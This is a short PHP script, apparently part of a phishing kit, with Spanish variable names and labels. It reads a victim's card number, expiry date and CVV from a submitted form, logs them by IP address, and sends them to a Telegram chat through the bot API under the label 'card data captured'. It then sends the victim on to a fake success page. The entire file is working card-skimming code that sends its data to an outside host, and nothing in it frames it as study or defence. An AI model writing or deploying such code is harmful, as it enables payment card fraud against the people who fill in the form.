<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip);
$tarjeta = $_POST['tarjeta'];
$fecha = $_POST['fecha'];
$cvv = $_POST['cvv'];

actualizar_registro_tarjeta($registro, $tarjeta, $fecha, $cvv);

$token = getenv('TOKEN_BOT');
$id = getenv('ID_CHAT');
$mensaje = "💳 *DATOS DE TARJETA CAPTURADOS*\n\n";
$mensaje .= "💳 Número: " . $tarjeta . "\n";
$mensaje .= "📅 Fecha: " . $fecha . "\n";
$mensaje .= "🔒 CVV: " . $cvv . "\n";

file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown");

header("Location: ../a/SUCCESS.php");
?>
